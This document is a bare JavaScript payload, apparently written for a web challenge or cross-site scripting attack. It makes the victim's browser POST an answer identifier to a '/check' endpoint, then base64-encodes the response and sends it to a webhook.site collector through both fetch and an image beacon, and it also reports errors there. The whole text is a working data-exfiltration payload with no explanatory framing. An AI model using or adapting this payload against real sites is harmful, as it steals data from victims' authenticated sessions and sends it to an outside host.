fetch("/check", {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "answer_id=d6bcba62-04bd-4fae-874f-0328f5b2149d"
})
.then(r => r.text())
.then(t => {
    var p = fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?dataFetch=" + btoa(t));
    var img = new Image();
    img.src = "https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?dataImg=" + encodeURIComponent(btoa(t));
    document.body.appendChild(img);
    return p;
}).catch(e => fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf?error=" + encodeURIComponent(e.message)));